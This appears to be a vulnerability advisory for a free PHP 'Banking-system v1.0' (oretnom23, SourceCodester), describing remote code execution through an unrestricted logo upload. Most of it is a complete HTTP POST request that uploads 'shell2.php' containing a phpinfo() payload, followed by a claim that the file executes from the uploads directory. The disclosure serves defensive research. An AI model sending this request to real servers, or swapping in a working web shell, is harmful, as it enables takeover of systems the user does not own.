## Banking-system v1.0 by oretnom23 has arbitrary code execution (RCE)

vendor: https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html

Vulnerability url: http://ip/banking/admin/?page=system_info 

Loophole location： Arbitrary file upload vulnerability exists in syetem logo upload point in system info (RCE)

Request package for file upload：

```sql
POST /banking/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 192.168.1.19
Content-Length: 840
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypYBMtJHzCdmOJB9I
Origin: http://192.168.1.19
Referer: http://192.168.1.19/banking/admin/?page=system_info
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v8g2iaa0tsnt5b01btt83eb7qo
Connection: close

------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="name"

Online Banking System
------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="short_name"

OBS
------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="about_us"

<p>Sample About Us</p>
------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="img"; filename="shell2.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
------WebKitFormBoundarypYBMtJHzCdmOJB9I
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarypYBMtJHzCdmOJB9I--

```

The files will be uploaded to this directory\ banking\ uploads\

![image](https://user-images.githubusercontent.com/54017627/161220332-234c40d6-e927-4617-8ace-caa0df8176e6.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/161220453-28a8a626-80d6-4582-8373-69aa05d2c7cc.png)
